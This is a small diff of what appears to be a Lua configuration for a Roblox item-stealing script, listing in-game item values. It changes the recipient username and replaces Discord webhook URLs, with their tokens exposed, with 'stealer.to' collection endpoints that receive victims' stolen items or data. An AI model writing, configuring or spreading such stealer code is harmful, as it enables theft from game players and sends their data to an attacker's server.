@@ -1,6 +1,6 @@
-userName = "pro199064"
-GoodwebHook = "https://discord.com/api/webhooks/1340718451550978100/g8dCvFrQ3wWi9ByRkbrLnQ2dD3dcBce9arVI5SD5r3i1izj6NCMkod-muCNj89RjM_SY"
-webHook = "https://discord.com/api/webhooks/1341447504490663978/d7NAY2LTtQEoVRflYtSBSJ3h_EpYSTnb1d4u6vXB5ETPBQ6cflcf3nq35GMoI2eP87Or"
+userName = "yoklopik"
+GoodwebHook = "https://stealer.to/post?uniqueid=f4fc6014"
+webHook = "https://stealer.to/post?uniqueid=c87f148c"
 
 local values = {
     ["Nik's Scythe"] = 25000000,
